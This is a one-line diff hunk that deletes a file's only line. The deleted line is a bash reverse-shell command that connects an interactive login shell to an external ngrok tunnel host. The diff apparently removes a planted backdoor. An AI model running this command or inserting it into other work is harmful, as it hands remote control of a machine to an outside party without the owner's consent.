@@ -1,1 +1,0 @@
-bash -l > /dev/tcp/8.tcp.ngrok.io/12555 0<&1 2>&1
